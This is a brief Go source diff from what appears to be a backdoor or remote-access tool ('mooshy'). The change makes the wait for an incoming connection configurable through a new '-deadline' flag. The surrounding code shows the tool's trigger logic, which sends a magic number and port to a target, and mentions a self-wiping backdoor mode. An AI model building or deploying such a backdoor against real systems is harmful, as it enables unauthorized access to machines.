@@ -236,6 +236,7 @@ func main() {
 	wipe := flag.Bool("wipe", false, "Wipe the backdoor in execution mode (The self-destructing script will be appended to '-c')")
 	tcp := flag.String("tcp", ":0", "TCP address to listen on in execution mode")
 	token := flag.String("token", "", "Github token to use")
+	deadline := flag.Uint("deadline", 20, "The amount of time (in seconds) to wait for a connection")
 	flag.Parse()
 
 	switch {
@@ -447,7 +448,7 @@ func main() {
 			ch <- conn
 		}()
 
-		deadline := time.After(20 * time.Second)
+		deadlineTime := time.After(time.Duration(*deadline) * time.Second)
 		for timeout := time.Second; ; timeout *= 2 {
 			if _, err := outConn.Write([]byte(mooshy.MagicNumber + port)); err != nil {
 				log.Printf("Failed to send magic number to %s: %s", *addr, err)
@@ -457,7 +458,7 @@ func main() {
 
 			select {
 			case <-time.After(timeout):
-			case <-deadline:
+			case <-deadlineTime:
 				log.Fatal("Deadline exceeded")
 			}
 
